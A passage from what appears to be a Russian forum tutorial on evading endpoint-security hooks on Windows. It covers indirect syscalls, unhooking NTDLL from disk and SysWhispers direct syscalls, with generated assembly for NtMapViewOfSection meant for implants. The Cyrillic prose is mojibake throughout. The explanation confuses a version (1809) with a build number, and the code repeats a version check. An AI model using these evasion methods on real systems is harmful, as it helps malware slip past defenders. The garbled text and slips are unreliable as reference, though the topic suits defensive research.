–∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –∏–∑ –∞–¥—Ä–µ—Å–Ω–æ–≥–æ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–∞ NTDLL, –∫–∞–∫ —ç—Ç–æ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å —É –Ω–æ—Ä–º–∞–ª—å–Ω—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤. –ü–æ—ç—Ç–æ–º—É –∫–æ—Å–≤–µ–Ω–Ω—ã–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã –±–æ–ª–µ–µ –≤–µ—Ä–æ—è—Ç–Ω–æ –ø—Ä–æ–π–¥—É—Ç –º–∏–º–æ —Ä–µ—à–µ–Ω–∏–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, —á–µ–º –ø—Ä—è–º—ã–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã.<br />
<br />
<b>–°–Ω—è—Ç–∏–µ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞</b><br />
<br />
–°–Ω—è—Ç–∏–µ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ - —ç—Ç–æ –µ—â–µ –æ–¥–∏–Ω —Å–ø–æ—Å–æ–± –æ–±—Ö–æ–¥–∞ –ø–µ—Ä–µ—Ö–≤–∞—Ç—á–∏–∫–æ–≤, –ø—Ä–∏ –∫–æ—Ç–æ—Ä–æ–º –ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–Ω–∞—è –±–∏–±–ª–∏–æ—Ç–µ–∫–∞ NTDLL, –∑–∞–≥—Ä—É–∂–µ–Ω–Ω–∞—è –≤ –ø–∞–º—è—Ç—å, –∑–∞–º–µ–Ω—è–µ—Ç—Å—è –Ω–∞ –≤–µ—Ä—Å–∏—é –±–µ–∑ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞. –ù–µ–ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è –º–æ–∂–µ—Ç –±—ã—Ç—å –ø–æ–ª—É—á–µ–Ω–∞ –∏–∑ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –º–µ—Å—Ç, <b>–Ω–æ –æ–¥–Ω–∏–º –∏–∑ –æ–±—â–∏—Ö –ø–æ–¥—Ö–æ–¥–æ–≤ —è–≤–ª—è–µ—Ç—Å—è –µ–µ –∑–∞–≥—Ä—É–∑–∫–∞ –Ω–µ–ø–æ—Å—Ä–µ–¥—Å—Ç–≤–µ–Ω–Ω–æ —Å –¥–∏—Å–∫–∞. </b>–¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, —É–¥–∞–ª—è—é—Ç—Å—è –≤—Å–µ –ø–µ—Ä–µ—Ö–≤–∞—Ç—á–∏–∫–∏, —Ä–∞–∑–º–µ—â–µ–Ω–Ω—ã–µ –≤ –±–∏–±–ª–∏–æ—Ç–µ–∫–µ NTDLL.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785542013.png"
		data-src="https://osint42.org/attachments/1746785542013-png.208/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785542013-png.208/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785542013.png"
			title="1746785542013.png"
			width="1307" height="713" loading="lazy" />
	</div><br />
<br />
<br />
<b>–ü—Ä—è–º–æ–π –≤—ã–∑–æ–≤ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ –ø—Ä–∏ –ø–æ–º–æ—â–∏</b> <a href="https://github.com/jthuraisamy/SysWhispers" target="_blank" class="link link--external" rel="noopener"><b>SysWhispers</b></a><br />
<br />
<b>–í–≤–µ–¥–µ–Ω–∏–µ</b><br />
<br />
SysWhispers - —ç—Ç–æ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –Ω–∞ –ø–∏—Ç–æ–Ω–µ, –∫–æ—Ç–æ—Ä—ã–π –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç –∫–æ–¥ –Ω–∞ —Å–∏ –∏ –∞—Å—Å–µ–º–±–ª–µ—Ä–µ, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∑–≤–æ–ª—è–µ—Ç –æ–±–æ–π—Ç–∏ –ø–µ—Ä–µ—Ö–≤–∞—Ç —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ —á–µ—Ä–µ–∑ –ø—Ä—è–º—ã–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã. –°—É—â–µ—Å—Ç–≤—É–µ—Ç –Ω–µ—Å–∫–æ–ª—å–∫–æ –≤–µ—Ä—Å–∏–π SysWhispers, –∏–º–µ—é—â–∏—Ö —Ä–∞–∑–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏. –†–∞–∑–ª–∏—á–∏—è –º–µ–∂–¥—É –≤–µ—Ä—Å–∏—è–º–∏ –±—É–¥—É—Ç —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω—ã –≤ —ç—Ç–æ–º –º–æ–¥—É–ª–µ.<br />
<br />
<b>SysWhispers: </b><br />
<br />
SysWhispers —Å–æ–∑–¥–∞–µ—Ç –∑–∞–≥–æ–ª–æ–≤–æ—á–Ω—ã–µ/ASM —Ñ–∞–π–ª—ã –∏–º–ø–ª–∞–Ω—Ç–æ–≤ –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ –ø—Ä—è–º—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ –Ω–∞ 64-–±–∏—Ç–Ω—ã—Ö —Å–∏—Å—Ç–µ–º–∞—Ö. –û–Ω –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã –æ—Ç Windows XP –¥–æ Windows 10 19042 (20H2). –ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã–µ –≤–µ—Ä—Å–∏–∏ Windows –æ–≥—Ä–∞–Ω–∏—á–µ–Ω—ã, –ø–æ—Å–∫–æ–ª—å–∫—É –Ω–æ–º–µ—Ä —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ (SSN) –º–æ–∂–µ—Ç –∏–∑–º–µ–Ω—è—Ç—å—Å—è —Å –∫–∞–∂–¥—ã–º –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ–º Windows. –¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, –ø—Ä—è–º–∞—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –¥–ª—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –Ω–∞ Windows 10 1903 –º–æ–∂–µ—Ç –±—ã—Ç—å –Ω–µ—Å–æ–≤–º–µ—Å—Ç–∏–º–∞ —Å —Ç–µ–º –∂–µ —Å–∏—Å—Ç–µ–º–Ω—ã–º –≤—ã–∑–æ–≤–æ–º –Ω–∞ Windows 10 1909 –∏ –Ω–∞–æ–±–æ—Ä–æ—Ç.<br />
<br />
–ü–æ—Å–∫–æ–ª—å–∫—É –æ–¥–Ω–∏ –∏ —Ç–µ –∂–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã –º–æ–≥—É—Ç –∏–º–µ—Ç—å —Ä–∞–∑–Ω—ã–µ SSN –Ω–∞ —Ä–∞–∑–Ω—ã—Ö –≤–µ—Ä—Å–∏—è—Ö Windows, SysWhispers –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –≤–µ—Ä—Å–∏—é Windows —Ü–µ–ª–µ–≤–æ–π —Å–∏—Å—Ç–µ–º—ã –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∏ –≤—Ä—É—á–Ω—É—é —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç SSN –¥–ª—è —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–µ–π –≤–µ—Ä—Å–∏–∏.<br />
<br />
<b>SysWhispers - –ü—Ä–∏–º–µ—Ä NtMapViewOfSection:</b><br />
<br />
SysWhispers –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Å–∫—Ä–∏–ø—Ç –Ω–∞ Python –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –¥–≤—É—Ö —Ñ–∞–π–ª–æ–≤ (–ø—Ä–∏–º–µ—Ä). SSN –±–µ—Ä—É—Ç—Å—è –∏–∑ <a href="https://j00ru.vexillium.org/syscalls/nt/64/" target="_blank" class="link link--external" rel="noopener">–¢–∞–±–ª–∏—Ü—ã —Å–∏—Å—Ç–µ–º–Ω—ã—Ö —ã—ã–∑–æ–≤–æ–≤ Windows X86-64</a> –∏ –∂–µ—Å—Ç–∫–æ –∫–æ–¥–∏—Ä—É—é—Ç—Å—è –≤ —Å–æ–∑–¥–∞–Ω–Ω—ã–π —Ñ–∞–π–ª —Å–±–æ—Ä–∫–∏. –ó–∞—Ç–µ–º —Ñ—É–Ω–∫—Ü–∏–∏ —Å–±–æ—Ä–∫–∏ –æ–ø—Ä–µ–¥–µ–ª—è—é—Ç, –∫–∞–∫–æ–π SSN –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å.<br />
<br />
<b>–í—ã—Ö–æ–¥–Ω–æ–π –ø—Ä–∏–º–µ—Ä SysWhispers: </b><br />
<br />
–ù–∏–∂–µ –ø—Ä–∏–≤–µ–¥–µ–Ω—ã —Ñ—É–Ω–∫—Ü–∏–∏ —Å–±–æ—Ä–∫–∏, –ø–æ–ª—É—á–µ–Ω–Ω—ã–µ –ø—Ä–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ SysWhispers –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –ø—Ä—è–º—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ –¥–ª—è NtMapViewOfSection.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>// ...

NtMapViewOfSection PROC
    mov rax, gs:[60h]                             ; Load PEB into RAX.
NtMapViewOfSection_Check_X_X_XXXX:                ; Check major version.
    cmp dword ptr [rax+118h], 5
    je  NtMapViewOfSection_SystemCall_5_X_XXXX
    cmp dword ptr [rax+118h], 6
    je  NtMapViewOfSection_Check_6_X_XXXX
    cmp dword ptr [rax+118h], 10
    je  NtMapViewOfSection_Check_10_0_XXXX
    jmp NtMapViewOfSection_SystemCall_Unknown
NtMapViewOfSection_Check_6_X_XXXX:               ; Check minor version for Windows Vista/7/8.
    cmp dword ptr [rax+11ch], 0
    je  NtMapViewOfSection_Check_6_0_XXXX
    cmp dword ptr [rax+11ch], 1
    je  NtMapViewOfSection_Check_6_1_XXXX
    cmp dword ptr [rax+11ch], 2
    je  NtMapViewOfSection_SystemCall_6_2_XXXX
    cmp dword ptr [rax+11ch], 2
    je  NtMapViewOfSection_SystemCall_6_3_XXXX
    jmp NtMapViewOfSection_SystemCall_Unknown
NtMapViewOfSection_Check_6_0_XXXX:               ; Check build number for Windows Vista.
    cmp dword ptr [rax+120h], 6000
    je  NtMapViewOfSection_SystemCall_6_0_6000
    cmp dword ptr [rax+120h], 6001
    je  NtMapViewOfSection_SystemCall_6_0_6001
    cmp dword ptr [rax+120h], 6002
    je  NtMapViewOfSection_SystemCall_6_0_6002
    jmp NtMapViewOfSection_SystemCall_Unknown
NtMapViewOfSection_Check_6_1_XXXX:               ; Check build number for Windows 7.
    cmp dword ptr [rax+120h], 7600
    je  NtMapViewOfSection_SystemCall_6_1_7600
    cmp dword ptr [rax+120h], 7601
    je  NtMapViewOfSection_SystemCall_6_1_7601
    jmp NtMapViewOfSection_SystemCall_Unknown
NtMapViewOfSection_Check_10_0_XXXX:              ; Check build number for Windows 10.
    cmp dword ptr [rax+120h], 10240
    je  NtMapViewOfSection_SystemCall_10_0_10240
    cmp dword ptr [rax+120h], 10586
    je  NtMapViewOfSection_SystemCall_10_0_10586
    cmp dword ptr [rax+120h], 14393
    je  NtMapViewOfSection_SystemCall_10_0_14393
    cmp dword ptr [rax+120h], 15063
    je  NtMapViewOfSection_SystemCall_10_0_15063
    cmp dword ptr [rax+120h], 16299
    je  NtMapViewOfSection_SystemCall_10_0_16299
    cmp dword ptr [rax+120h], 17134
    je  NtMapViewOfSection_SystemCall_10_0_17134
    cmp dword ptr [rax+120h], 17763
    je  NtMapViewOfSection_SystemCall_10_0_17763
    cmp dword ptr [rax+120h], 18362
    je  NtMapViewOfSection_SystemCall_10_0_18362
    cmp dword ptr [rax+120h], 18363
    je  NtMapViewOfSection_SystemCall_10_0_18363
    jmp NtMapViewOfSection_SystemCall_Unknown
NtMapViewOfSection_SystemCall_5_X_XXXX:          ; Windows XP and Server 2003
    mov eax, 0025h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_6_0_6000:          ; Windows Vista SP0
    mov eax, 0025h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_6_0_6001:          ; Windows Vista SP1 and Server 2008 SP0
    mov eax, 0025h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_6_0_6002:          ; Windows Vista SP2 and Server 2008 SP2
    mov eax, 0025h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_6_1_7600:          ; Windows 7 SP0
    mov eax, 0025h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_6_1_7601:          ; Windows 7 SP1 and Server 2008 R2 SP0
    mov eax, 0025h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_6_2_XXXX:          ; Windows 8 and Server 2012
    mov eax, 0026h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_6_3_XXXX:          ; Windows 8.1 and Server 2012 R2
    mov eax, 0027h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_10_0_10240:        ; Windows 10.0.10240 (1507)
    mov eax, 0028h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_10_0_10586:        ; Windows 10.0.10586 (1511)
    mov eax, 0028h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_10_0_14393:        ; Windows 10.0.14393 (1607)
    mov eax, 0028h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_10_0_15063:        ; Windows 10.0.15063 (1703)
    mov eax, 0028h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_10_0_16299:        ; Windows 10.0.16299 (1709)
    mov eax, 0028h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_10_0_17134:        ; Windows 10.0.17134 (1803)
    mov eax, 0028h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_10_0_17763:        ; Windows 10.0.17763 (1809)
    mov eax, 0028h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_10_0_18362:        ; Windows 10.0.18362 (1903)
    mov eax, 0028h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_10_0_18363:        ; Windows 10.0.18363 (1909)
    mov eax, 0028h
    jmp NtMapViewOfSection_Epilogue
NtMapViewOfSection_SystemCall_Unknown:           ; Unknown/unsupported version.
    ret
NtMapViewOfSection_Epilogue:
    mov r10, rcx
    syscall
    ret
NtMapViewOfSection ENDP

// ...</code></pre>
	</div>
</div><br />
<b>–û–±—ä—è—Å–Ω–µ–Ω–∏–µ:</b><br />
<br />
–°—Ç—Ä—É–∫—Ç—É—Ä–∞ PEB —Å–æ–¥–µ—Ä–∂–∏—Ç —Ç—Ä–∏ —ç–ª–µ–º–µ–Ω—Ç–∞, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –≤–µ—Ä—Å–∏–∏ Windows OS:<br />
<ul>
<li data-xf-list-type="ul">OSBuildNumber</li>
<li data-xf-list-type="ul">OSMajorVersion</li>
<li data-xf-list-type="ul">OSMinorVersion</li>
</ul>64-–±–∏—Ç–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ —Å–±–æ—Ä–∫–∏, —Å–æ–∑–¥–∞–Ω–Ω—ã–µ SysWhispers, –∏—Å–ø–æ–ª—å–∑—É—é—Ç —ç—Ç–∏ —ç–ª–µ–º–µ–Ω—Ç—ã –¥–ª—è –ø–µ—Ä–µ—Ö–æ–¥–∞ –Ω–∞ –º–µ—Å—Ç–æ, –≥–¥–µ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π SSN –≤ –≤–∏–¥–µ –∂–µ—Å—Ç–∫–æ –∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –∑–Ω–∞—á–µ–Ω–∏—è. –ò—Å–ø–æ–ª—å–∑—É–µ–º–∞—è –ª–æ–≥–∏–∫–∞ –ø–æ —Å—É—Ç–∏ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –Ω–µ—Å–∫–æ–ª—å–∫–æ if –∏ else if —É—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–π. –ù–∞–ø—Ä–∏–º–µ—Ä, –µ—Å–ª–∏ —Ü–µ–ª–µ–≤–∞—è –º–∞—à–∏–Ω–∞ - Windows 10 1809, —Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç —Å–ª–µ–¥—É—é—â–∞—è –ª–æ–≥–∏–∫–∞:<br />
<ul>
<li data-xf-list-type="ul">–ü–æ—Å–∫–æ–ª—å–∫—É –æ—Å–Ω–æ–≤–Ω–æ–π —ç–ª–µ–º–µ–Ω—Ç –≤–µ—Ä—Å–∏–∏ PEB —Ä–∞–≤–µ–Ω 10, –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –º–µ—Ç–∫–∞ NtMapViewOfSection_Check_10_0_XXXX.</li>
<li data-xf-list-type="ul">–≠—Ç–∞ –º–µ—Ç–∫–∞ –∑–∞—Ç–µ–º –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –Ω–æ–º–µ—Ä —Å–±–æ—Ä–∫–∏ —Å–∏—Å—Ç–µ–º—ã. –í —ç—Ç–æ–º –ø—Ä–∏–º–µ—Ä–µ —ç—Ç–æ—Ç –Ω–æ–º–µ—Ä —Ä–∞–≤–µ–Ω 1809, —á—Ç–æ –∑–∞—Å—Ç–∞–≤–ª—è–µ—Ç –µ–≥–æ –ø–µ—Ä–µ–π—Ç–∏ –Ω–∞ –º–µ—Ç–∫—É NtMapViewOfSection_SystemCall_10_0_17763.</li>
<li data-xf-list-type="ul">–ó–∞—Ç–µ–º SSN —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –≤ 0028h.</li>
<li data-xf-list-type="ul">–ó–∞—Ç–µ–º –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç —Ñ–∏–Ω–∞–ª—å–Ω—ã–π –ø–µ—Ä–µ—Ö–æ–¥ –Ω–∞ –º–µ—Ç–∫—É NtMapViewOfSection_Epilogue, –≥–¥–µ –≤—ã–ø–æ–ª–Ω—è—é—Ç—Å—è –æ—Å—Ç–∞–≤—à–∏–µ—Å—è –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞. –ù–∞–ø–æ–º–Ω–∏–º, —á—Ç–æ —Ñ—É–Ω–∫—Ü–∏—è —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –∏–º–µ–µ—Ç —Å–ª–µ–¥—É—é—â–∏–π —Ñ–æ—Ä–º–∞—Ç:</li>
</ul>
	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>mov r10, rcx
mov eax, SSN
syscall
ret</code></pre>
	</div>
</div><br />
<b>SysWhispers2: </b><br />
<br />
<a href="https://github.com/jthuraisamy/SysWhispers2" target="_blank" class="link link--external" rel="noopener">SysWhispers2</a> –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Ç—É-–∂–µ –∫–æ–Ω—Ü–µ–ø—Ü–∏—é, —á—Ç–æ –∏ –µ–≥–æ –ø—Ä–µ–¥—ã–¥—É—â–∞—è –≤–µ—Ä—Å–∏—è, –≥–ª–∞–≤–Ω–æ–µ –æ—Ç–ª–∏—á–∏–µ –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —Ç–æ–º, —á—Ç–æ SysWhispers2 –Ω–µ —Ç—Ä–µ–±—É–µ—Ç –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —É–∫–∞–∑–∞–Ω–∏—è, –∫–∞–∫–∏–µ –≤–µ—Ä—Å–∏–∏ Windows –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞—Ç—å –≤ –≥–µ–Ω–µ—Ä–∞—Ç–æ—Ä–µ Python.<br />
<br />
–≠—Ç–æ –ø–æ—Ç–æ–º—É, —á—Ç–æ SysWhispers2 –±–æ–ª—å—à–µ –Ω–µ –ø–æ–ª–∞–≥–∞–µ—Ç—Å—è –Ω–∞ –¢–∞–±–ª–∏—Ü—É —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –í—ã–∑–æ–≤–æ–≤ Windows X86-64 –¥–ª—è SSN, –∞ –≤–º–µ—Å—Ç–æ —ç—Ç–æ–≥–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –º–µ—Ç–æ–¥,<b> –Ω–∞–∑—ã–≤–∞–µ–º—ã–π —Å–æ—Ä—Ç–∏—Ä–æ–≤–∫–∞ –ø–æ –∞–¥—Ä–µ—Å—É —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞.</b> –≠—Ç–æ—Ç –º–µ—Ç–æ–¥ –∏—Å–∫–ª—é—á–∞–µ—Ç –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç—å –≤ —Ä—É—á–Ω–æ–º –≤—ã–±–æ—Ä–µ SSN –Ω–∞ —ç—Ç–∞–ø–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è, —á—Ç–æ –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ –º–µ–Ω—å—à–µ–º—É —Ä–∞–∑–º–µ—Ä—É –æ–±–æ–ª–æ—á–µ–∫ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤.<br />
<br />
<b>–°–æ—Ä—Ç–∏—Ä–æ–≤–∫–∞ –ø–æ –∞–¥—Ä–µ—Å—É —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞:</b><br />
<br />
–°–æ—Ä—Ç–∏—Ä–æ–≤–∫–∞ –ø–æ –∞–¥—Ä–µ—Å—É —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ - —ç—Ç–æ –º–µ—Ç–æ–¥ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è SSN —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è. –≠—Ç–æ –¥–µ–ª–∞–µ—Ç—Å—è –ø—É—Ç–µ–º –ø–æ–∏—Å–∫–∞ –≤—Å–µ—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤, –Ω–∞—á–∏–Ω–∞—é—â–∏—Ö—Å—è —Å Zw, –∑–∞—Ç–µ–º —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –∏—Ö –∞–¥—Ä–µ—Å–∞ –≤ –º–∞—Å—Å–∏–≤–µ –∏ —Å–æ—Ä—Ç–∏—Ä–æ–≤–∫–∏ –∏—Ö –≤ –≤–æ–∑—Ä–∞—Å—Ç–∞—é—â–µ–º –ø–æ—Ä—è–¥–∫–µ (–æ—Ç –º–µ–Ω—å—à–µ–≥–æ –∫ –±–æ–ª—å—à–µ–º—É –∞–¥—Ä–µ—Å—É). SSN —Å—Ç–∞–Ω–µ—Ç –∏–Ω–¥–µ–∫—Å–æ–º —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω–æ–≥–æ –≤ –º–∞—Å—Å–∏–≤–µ.<br />
<br />
<b>–†–µ–∞–ª–∏–∑–∞—Ü–∏—è SysWhispers2</b>:<br />
<br />
–°–æ—Ä—Ç–∏—Ä–æ–≤–∫–∞ –ø–æ –∞–¥—Ä–µ—Å—É —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –æ—Å—É—â–µ—Å—Ç–≤–ª—è–µ—Ç—Å—è —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü–∏—é SW2_PopulateSyscallList Syswhispers2, –∫–æ—Ç–æ—Ä–∞—è –∏–∑–≤–ª–µ–∫–∞–µ—Ç –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å NTDLL –∏ –µ–≥–æ —ç–∫—Å–ø–æ—Ä—Ç–Ω—ã–π –∫–∞—Ç–∞–ª–æ–≥. –ò—Å–ø–æ–ª—å–∑—É—è —ç—Ç—É –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é, –æ–Ω–∞ —Ä–∞—Å—Å—á–∏—Ç—ã–≤–∞–µ—Ç RVA —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ–º—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π (–∞–¥—Ä–µ—Å–∞, –∏–º–µ–Ω–∞, –ø–æ—Ä—è–¥–æ–∫).<br />
<br />
–î–∞–ª–µ–µ SysWhispers2 –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –∏–º–µ–Ω–∞ —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ–º—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π –Ω–∞ –ø—Ä–µ–¥–º–µ—Ç –ø—Ä–µ—Ñ–∏–∫—Å–æ–≤ —Å Zw. –≠—Ç–∏ –∏–º–µ–Ω–∞ —Ñ—É–Ω–∫—Ü–∏–π —Ö–µ—à–∏—Ä—É—é—Ç—Å—è –∏ —Å–æ—Ö—Ä–∞–Ω—è—é—Ç—Å—è –≤ –º–∞—Å—Å–∏–≤–µ –≤–º–µ—Å—Ç–µ —Å –∏—Ö –∞–¥—Ä–µ—Å–∞–º–∏. –ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ SW2_PopulateSyscallList —Å–æ—Ä—Ç–∏—Ä—É–µ—Ç —Å–æ–±—Ä–∞–Ω–Ω—ã–µ –∞–¥—Ä–µ—Å–∞ –≤ –≤–æ–∑—Ä–∞—Å—Ç–∞—é—â–µ–º –ø–æ—Ä—è–¥–∫–µ.<br />
<br />
